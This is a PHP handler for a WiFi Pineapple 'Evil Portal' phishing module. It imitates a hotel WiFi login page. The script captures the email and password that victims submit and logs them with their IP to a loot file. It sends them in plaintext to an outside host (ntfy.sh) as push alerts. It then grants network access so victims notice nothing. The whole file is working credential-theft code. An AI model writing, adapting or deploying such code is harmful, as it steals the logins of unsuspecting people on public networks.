<?php
namespace evilportal;

// Suppress warnings from Portal.php reading missing temp files
error_reporting(E_ERROR | E_PARSE);

header("Cache-Control: no-store, no-cache, must-revalidate");

// Create temp files if they do not exist
@touch("/tmp/EVILPORTAL_CLIENTS.txt");
@touch("/tmp/EVILPORTAL_PROCESSED.txt");

require_once("/pineapple/ui/modules/evilportal/assets/api/Portal.php");
require_once("MyPortal.php");

$ntfy_enabled = 1;
$ntfy_topic = trim(@file_get_contents("/root/.garmr_ntfy_topic"));

function send_ntfy($title, $message, $priority, $tags) {
    global $ntfy_enabled, $ntfy_topic;
    if (!$ntfy_enabled || empty($ntfy_topic)) return;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://ntfy.sh/$ntfy_topic");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $message);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ["Title: $title", "Priority: $priority", "Tags: $tags"]);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_exec($ch);
    curl_close($ch);
}

$loot_file = "/root/loot/garmr/credentials.txt";
$email = isset($_POST["email"]) ? $_POST["email"] : "";
$password = isset($_POST["password"]) ? $_POST["password"] : "";
$client_ip = $_SERVER["REMOTE_ADDR"];
$timestamp = date("Y-m-d H:i:s");

@mkdir("/root/loot/garmr", 0755, true);

if (!empty($email)) {
    $entry = "[$timestamp] Hotel | IP: $client_ip | Email: $email | Pass: $password\n";
    file_put_contents($loot_file, $entry, FILE_APPEND);

    // NTFY notification using PHP curl
    send_ntfy("GARMR: Hotel Creds!", "Email: $email\nPassword: $password\nIP: $client_ip", "high", "wifi,hotel");

    $portal_obj = new MyPortal((object)$_POST);
    $portal_obj->authorizeClient($client_ip);
}

header("Location: /success.html");
exit;
